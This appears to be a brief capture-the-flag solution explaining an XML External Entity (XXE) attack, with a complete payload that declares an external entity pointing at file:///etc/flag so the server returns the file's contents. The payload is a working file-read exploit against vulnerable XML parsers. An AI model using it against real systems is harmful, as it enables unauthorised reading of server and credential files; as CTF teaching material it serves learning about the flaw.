XML eXternal Entities! You can use your browser's devtools, any http request client that supports XML or burp suite to change the request to:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY pwn SYSTEM 'file:///etc/flag'>] >
    <root>
	<query>
	    rick roll! &pwn;
	</query>
    </root>
```

And you will get as a response the file contents with the flag!!
